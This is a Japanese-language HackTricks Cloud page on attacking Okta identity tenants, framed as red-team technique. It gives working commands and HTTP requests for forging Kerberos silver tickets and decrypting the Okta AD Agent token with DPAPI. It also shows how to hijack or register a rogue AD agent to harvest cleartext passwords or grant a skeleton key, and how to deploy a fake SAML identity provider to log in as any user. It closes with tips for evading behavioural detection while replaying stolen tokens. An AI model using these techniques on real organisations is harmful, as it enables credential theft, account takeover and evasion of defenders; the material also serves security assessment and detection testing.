# Oktaセキュリティ

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSやHackTricksのPDFをダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するために、PRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに参加する**

</details>

## 基本情報

Okta, Inc.は、クラウドソフトウェアを提供して企業が現代のアプリケーションにユーザー認証を**管理し、保護する**ための**アイデンティティとアクセス管理**会社です。また、開発者がアプリケーション、ウェブサービス、デバイスにアイデンティティコントロールを構築するのを支援します。

彼らのコアサービスであるOkta Identity Cloudは、シングルサインオン（SSO）、マルチファクタ認証（MFA）、ライフサイクル管理、ユニバーサルディレクトリ、APIアクセス管理などの製品を提供しています。これにより、企業は機密データを保護し、ユーザーアクセスを効率化することができます。これにより、従業員や顧客がアプリケーションやサービスによりアクセスしやすく、利用しやすくなります。

Oktaのサービスは、大企業だけでなく、中小企業や開発者にも広く利用されています。これにより、ビジネスがクラウドテクノロジーを安全に採用し、管理することができます。私の知識の範囲では、2021年9月までにOktaはアイデンティティとアクセス管理（IAM）業界で重要な役割を果たしていると言えます。

{% hint style="danger" %}
Oktaの主な目標は、異なるユーザーやグループに対して外部アプリケーションへのアクセスを構成することです。もしOktaの管理者特権を侵害できれば、おそらく会社が使用している他のすべてのプラットフォームを侵害することができます。
{% endhint %}

{% hint style="success" %}
Okta環境のセキュリティレビューを実施するには、**管理者の読み取り専用アクセス**を要求する必要があります。
{% endhint %}

### 概要

**ユーザー**（Oktaに保存される、構成された**Identity Providers**からのログイン、または**Active Directory**またはLDAPを介して認証されることができる）が存在します。\
これらのユーザーは**グループ**に所属することができます。\
また、**認証子**もあります：パスワードなどの認証方法や、WebAuthn、メール、電話、Okta Verifyなどのさまざまな2FAがあります（有効または無効にできます）...

次に、Oktaと同期された**アプリケーション**があります。各アプリケーションは、電子メールアドレス、名前などの情報を共有するためにOktaとの**マッピング**を持つでしょう。さらに、各アプリケーションは**認証ポリシー**内にある必要な**認証子**を示します。これにより、ユーザーがアプリケーションに**アクセス**するために必要な認証子がわかります。

{% hint style="danger" %}
最も強力な役割は**スーパー管理者**です。

攻撃者が管理者アクセスでOktaを侵害すると、Oktaを信頼している**すべてのアプリケーションが高い確率で侵害**されます。
{% endhint %}

## 攻撃

### Oktaポータルの特定

通常、企業のポータルは**companyname.okta.com**にあります。そうでない場合は、**companyname**の単純な**バリエーション**を試してみてください。見つけることができない場合は、組織が**Oktaポータル**を指す**`okta.companyname.com`**のような**CNAME**レコードを持っている可能性もあります。

### Kerberosを介したOktaへのログイン

（攻撃は[**ここから**](https://trustedsec.com/blog/okta-for-red-teamers)コピーされました）。

**`companyname.kerberos.okta.com`**のようなドメインが存在する場合、企業内でKerberosが構成されてOktaにアクセスできるようになっています。これは非常に興味深いですが、通常、WindowsユーザーはOktaにアクセスするためにMFAは必要ありません。

また、AD環境でOktaアクセスが構成されたKerberosユーザーを見つけることも可能です。
```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```
ADユーザーのチケットを取得したら、RubeusまたはMimikatzを使用して、制御下のホストにこれを注入する必要があります。

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

「クライアント名.kerberos.okta.com」が「Intranet」セキュリティゾーンに追加されていることを確認する必要があります。そして、ブラウザで以下のURLにアクセスすると、Kerberosチケットが受け入れられた場合に「OK」の結果を提供するJSONレスポンスを受け取るはずです。

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Oktaダッシュボードに移動すると、すべてが正常であれば、サインインされます。

さらに、デリゲーションSPNを公開する実際のOktaサービスアカウントを侵害できれば、Silver Ticket攻撃を実行できます。

Oktaはチケットの暗号化にAESのみをサポートしているため、認証にはAESキーまたは平文パスワードが必要です。

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

被害者ユーザー「testuser」のチケットを作成するには、次のようにします：

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
{% endcode %}

そして、再び、ブラウザセッションを介してこれをOktaに送信します：

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Okta ADエージェントのハイジャック

（攻撃は[**ここから**](https://trustedsec.com/blog/okta-for-red-teamers)コピーされました）。

Okta ADエージェントが実行されているサーバーにアクセスすると、このエージェントはドメインのユーザーとグループをOktaに同期し、プロビジョニングのためにOktaに認証リクエストに応答します。

デフォルトでは、エージェントは次の場所にインストールされます：
```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```
`OktaAgentService.exe.config`を見てみましょう。このファイルにはいくつかの興味深いXMLが含まれています。

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

私たちの目標は、Base64でエンコードされた`AgentToken`です。`OktaAgentService.exe`をdnSpyで開くと、これらの値がどのように復号化されるかがわかります。

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

そうです...古き良きDPAPIです！`RandomEntropy`の値は次のように設定されています：

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

これは、Base64でエンコードされたXML値を次のように復号化できることを意味します：
```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```
使用されるDPAPIマスターキーは、「Okta ADエージェント」サービスを実行しているユーザーアカウントに属しています。したがって、上記のコマンドをサービスアカウントのコンテキストで実行するか、アカウントのマスターキーを取得して復号する必要があります。

たとえば、`OktaAgentService.exe.config`内には、さらに2つのXMLフィールド、`APPID`と`AGENTID`があります。`AgentToken`と組み合わせて、次のように`GET`リクエストを行うことができます。

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```
この呼び出しは、ユーザーがOktaに認証するまで（またはリクエストがタイムアウトするまで）ブロックされ、その場合には次に提供されるユーザー名とパスワードをクリアテキストで返します。
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
<UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
<type>USER_AUTH</type>
<password>abc123</password>
<useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
<userName>domuser@lab.local</userName>
</UserAuth>
</action>
```
これにより資格情報をキャプチャすることができますが、スケルトンキーを提供するなど、認証試行に対して応答する機会もあります。次のHTTPリクエストを発行することでこれを行います。
```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
<type>USER_AUTH</type>
<status>SUCCESS</status>
<message></message>
<errorCode></errorCode>
<timestamps>
<actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
<actionSentToLdapServer>1694358076</actionSentToLdapServer>
<responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
<responseSentToOkta>1694358076</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```
このリクエストを発行することで、Oktaを介して任意のユーザーの認証が許可されます。

### 管理者としてのADハイジャック

（攻撃は[**ここから**](https://trustedsec.com/blog/okta-for-red-teamers)コピーされました）。

Okta ADエージェントを盗まれたエージェントトークンを使用してハイジャックできることはわかっていますが、特権のあるOktaアカウントを侵害し、既存のエージェントトークンなしでこれを行いたい場合はどうなるでしょうか？ これを行う方法を見てみましょう。

まず、Okta ADエージェントAPIトークンを作成する必要があります。認証フローを開始するためには、OAuthコードが必要です。これを取得するためには、次の手順を実行します：

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
{% endcode %}

これにより、許可のプロンプトが表示されます：

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

提示されたプロンプトを受け入れると、`/oauth-response` へのリダイレクトと `code` パラメータが表示されます：

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

この `code` パラメータを使用して、POST リクエストを行い API トークンを取得する必要があります：
```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```
レスポンスは私たちにAPIトークンを返します。
```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```
このトークンを使用して、アクティブなADドメインと関連付ける必要があります。これは、API呼び出しを使用して行います：
```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```
次のXMLレスポンスが返されます。後で`id`属性の値を保持する必要があります。
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```
次に、私たちはHTTP APIを使用してコネクタの名前を指定します：
```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```
これにより、`id`属性を保持する必要があるXMLレスポンスが返されます：

{% code overflow="wrap" %}
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
{% endcode %}

最後に、データの受信を許可するために接続を初期化します：
```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<type>INIT</type>
<status>SUCCESS</status>
<timestamps>
<actionRecieivedFromOkta />
<actionSentToLdapServer />
<responseReceivedFromLdapServer />
<responseSentToOkta>1694304008</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{}</additionalInfo>
</agentActionResult>
```
これで、偽のADエージェントが準備完了し、以前に示したように認証試行を処理します。

明らかに、すべてをBurpを使用して行うわけにはいかないので、いくつかのユースケースをサポートするためにツールが作成されました。これは[こちら](https://github.com/xpn/OktaPostExToolkit)から入手できます。

このツールを実行する最初のモードは「token」モードで、侵害されたエージェントトークンの値を取得し、Okta APIに接続して受け取ったすべての資格情報をダンプします。

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
{% endcode %}

ビデオの例：

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

このツールは、管理者の資格情報が利用可能な場合、Oktaユーザーに新しいADコネクタを登録することも可能です：

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### OktaフェイクSAMLプロバイダ

（攻撃は[**ここから**](https://trustedsec.com/blog/okta-for-red-teamers)コピーされました）。

アセスメント中に非常に有用なテクニックのもう一つは、フェイクSAMLプロバイダの展開です。

最近、Oktaは実際にこのテクニックを使用した攻撃に関する[セキュリティアップデート](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection)を提供しましたので、特にこの特定の攻撃の検出をテストしたいクライアントにとっては、環境上での活動のシミュレーション時にこれを知っておくと便利です。

もし、昇格されたOktaアカウントへのアクセス権を持っている場合、Oktaの機能の一部として外部のIdentity Providerを展開することができます。これにより、Entra IDのような外部プロバイダが認証を完了し、ユーザーをOktaにリダイレクトして統合アプリを選択することができます。

しかし、IDPを制御している場合はどうなるでしょうか？この場合、私たちは任意の認証リクエストを承認することができるということになります。

これをテストするためには、カスタムのIdentity Providerを展開する必要があります。私たちの悪意のある活動をサポートする非常に不安定なSAML IDPは[こちら](https://github.com/xpn/OktaPostExToolkit)で見つけることができます。このツールの基本的なアイデアは、私たちが好きなユーザーに対応する署名付きのSAML認証応答を発行できるようにすることです。

このサーバーは`/saml`で受信するHTTPリクエストをリッスンしますので、まずはOktaにIDPを展開する必要があります。

まず、SAML 2.0 IDPを選択します：

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

IDPを設定する際には、いくつかの設定に注意する必要があります。まずは`Name`です。これはOktaの他の管理者に表示されるフレンドリーな名前です。

次に、発行者URLを設定する必要があります。これはURI形式の識別子の値に設定する必要があります。これも何でも構いませんが、`https://www.example.com/`を使用します。

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

また、`IdP Single Sign-On URL`フィールドを私たちのSAMLサーバーが実行されている場所に設定する必要があります。さて、クールなことは、これは私たちのサーバーを指す必要はないということです。ここで入力するURLにはかなり創造的になることができるので、Blue Teamの仕事を少し難しくすることができます。例えば、これを`https://idp.google.com/saml`のようなものに設定することもできますし、私たちができることは受信するSAMLリクエストをキャッチするだけです。ここがクールなことです：SAMLリクエストはクライアント側に転送されます。つまり、OktaはSAML `AuthRequest`を生成し、私たちのブラウザを`https://idp.google.com/`にリダイレクトします。これはもちろん、私たちがローカルホストファイルを変更して`idp.google.com`を`127.0.0.1`に向けることができるということを意味します：
```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```
私たちは、自分たちが制御する署名証明書も必要です。これは自己署名であり、OpenSSLを使用して生成することができます。

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

再度、これについては創造的になることができます。この証明書の信頼性に関する具体的な要件はありません。

キーが生成されたら、証明書をOktaにアップロードし、IDPを作成します。

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

最後に、`Match Against`が`Okta Username or Email`に設定されていること、および`Account Link Policy`が`Automatic`に設定されていることを確認して、既存のOktaアカウントに認証できるようにします。

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

すべて保存したら、メタデータをダウンロードする必要があります。

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

次に、認証リクエストを開始し、`AuthRequest`を発行するために、`Assertion Consumer Service URL`に表示されるURLに移動します。

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

このURLに移動すると、内部のSAMLサーバーにリダイレクトされます。

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

メールアドレスを提供すると、他のOktaユーザーの資格情報を知らなくても認証できることがわかります。

これを実際に見てみましょう：[https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)

### Evilgnixを使用したOktaポータルのフィッシング

[**このブログポスト**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)では、Oktaポータルに対するフィッシングキャンペーンの準備方法が説明されています。

### 同僚のなりすまし攻撃

Oktaでは、各ユーザーが持つことができ、変更することができる**属性**（メールアドレスや名前など）を設定することができます。ユーザーが変更できる**属性**をIDとして信頼している**アプリケーション**がある場合、そのプラットフォームで他のユーザーになりすますことができます。

したがって、アプリが**`userName`**フィールドを信頼している場合、おそらくそれを変更することはできません（通常、そのフィールドを変更することはできません）。しかし、たとえば**`primaryEmail`**を信頼している場合、同僚のメールアドレスに変更してなりすますことができるかもしれません（メールにアクセスし、変更を承認する必要があります）。

なお、このなりすまし攻撃は、各アプリケーションの設定方法に依存します。変更したフィールドを信頼し、更新を受け入れるアプリケーションのみが危険にさらされます。\
したがって、そのフィールドが存在する場合、アプリはこのフィールドを有効にする必要があります。

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

他のアプリでも脆弱性があるが、Oktaの設定にそのフィールドがない場合もあります（最終的には異なるアプリは異なる方法で設定されています）。

各アプリで誰でもなりすますことができるかどうかを確認する最良の方法は、試してみることです！

## 行動検知ポリシーの回避 <a href="#9fde" id="9fde"></a>

事前に公開されていない限り、行動検知ポリシーが実装されているかどうかはわかりません。Oktaの行動検知ポリシーをバイパスする**潜在的な方法**は、単に**メインのOktaダッシュボードを回避**し、直接Oktaアプリケーションをターゲットにすることです（これは、上記のスクリーンショットで赤いボックスで隠されているアプリケーションです）。ターゲット企業のメインOktaログインページでトークンを再生する代わりに、Oktaアプリケーション固有のURLでトークンを再生します。

その他の推奨事項は次のとおりです：

* 人気のある匿名化プロキシやVPNサービスからキャプチャされたアクセストークンを再生する際は注意してください。
* アクセストークンを再生する際は、クライアントが使用するときと同じユーザーエージェント文字列を使用してください。
* 同じIPアドレスから別のユーザーのキャプチャされたアクセストークンを再生する際は注意してください。
* キャプチャされたアクセストークンをOktaダッシュボードに対して再生する際は注意してください。
* 被害者が使用する予定の企業のIPアドレスを知っている場合は、そのIPアドレスまたはIP範囲以外のトラフィックをすべてブロックすることを検討してください。

## Oktaの強化

Oktaには多くの可能な設定があります。このページでは、できるだけ安全な状態にするためにそれらを確認する方法を説明します：

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## 参考文献

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* **HackTricksの広告を掲載したい場合や、最新バージョンのPEASSを入手したい場合は、またはHackTricksをPDFでダウンロードしたい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をご確認ください！**
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、私たちの独占的な[NFT](https://opensea.io/collection/the-peass-family)コレクションを発見しましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **HackTricksとHackTricks CloudのGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。**

</details>
